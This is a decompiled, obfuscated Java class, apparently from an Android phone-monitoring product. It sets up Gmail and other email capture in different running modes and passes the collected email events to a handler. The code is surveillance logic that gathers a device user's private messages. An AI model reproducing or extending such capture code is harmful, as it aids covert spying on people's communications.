package com.vvt.capture.email.generic;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.email.c;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  private com.vvt.base.a d;
  private e e;
  private f f;
  private com.vvt.capture.email.a.d g;
  private String h;
  
  public a(String paramString1, RunningMode paramRunningMode, com.vvt.base.a parama, Context paramContext, com.vvt.n.a.b paramb, String paramString2)
  {
    this.h = paramString1;
    this.d = parama;
    Object localObject1 = new com/vvt/capture/email/a/a;
    ((com.vvt.capture.email.a.a)localObject1).<init>();
    localObject1 = ((com.vvt.capture.email.a.a)localObject1).a(paramContext, paramRunningMode);
    this.g = ((com.vvt.capture.email.a.d)localObject1);
    localObject1 = RunningMode.FULL;
    boolean bool;
    Object localObject2;
    if (paramRunningMode == localObject1)
    {
      bool = b;
      if (bool) {}
      localObject1 = new com/vvt/capture/email/generic/b/a;
      ((com.vvt.capture.email.generic.b.a)localObject1).<init>();
      this.e = ((e)localObject1);
      localObject1 = new com/vvt/capture/email/generic/b/d;
      localObject2 = this.h;
      ((com.vvt.capture.email.generic.b.d)localObject1).<init>((String)localObject2);
      ((com.vvt.capture.email.generic.b.d)localObject1).a(paramString2);
      this.f = ((f)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = RunningMode.LIMITED_1;
      if (paramRunningMode == localObject1)
      {
        bool = b;
        if (bool) {}
        localObject1 = new com/vvt/capture/email/generic/a/a;
        ((com.vvt.capture.email.generic.a.a)localObject1).<init>(paramb);
        this.e = ((e)localObject1);
        localObject1 = new com/vvt/capture/email/generic/a/b;
        ((com.vvt.capture.email.generic.a.b)localObject1).<init>();
        localObject2 = this.h;
        ((com.vvt.capture.email.generic.a.b)localObject1).a((String)localObject2);
        ((com.vvt.capture.email.generic.a.b)localObject1).b(paramString2);
        localObject2 = this.g;
        ((com.vvt.capture.email.generic.a.b)localObject1).a((com.vvt.capture.email.a.d)localObject2);
        this.f = ((f)localObject1);
      }
      else
      {
        bool = c;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof EmailEventReference;
    if (bool) {
      paramg = (EmailEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/capture/email/generic/EmailEventReference;
      paramg.<init>();
    }
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if ((!bool1) || (paramList != null))
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        boolean bool3 = localObject instanceof c;
        if (bool3)
        {
          localObject = (c)localObject;
          com.vvt.capture.email.a.d locald = this.g;
          localObject = com.vvt.capture.email.b.a((c)localObject, locald);
          localArrayList.add(localObject);
        }
      }
      Object localObject = this.d;
      if (localObject != null)
      {
        int i = localArrayList.size();
        if (i > 0)
        {
          boolean bool2 = k();
          if (bool2)
          {
            bool2 = a;
            if (bool2) {}
            localObject = this.d;
            ((com.vvt.base.a)localObject).a(localArrayList);
          }
        }
      }
    }
  }
  
  protected e b()
  {
    return this.e;
  }
  
  protected f c()
  {
    return this.f;
  }
  
  protected String d()
  {
    return "GenericEmailCapture";
  }
  
  protected String e()
  {
    return this.h;
  }
  
  protected String f()
  {
    return "generic_gmail.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/generic/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */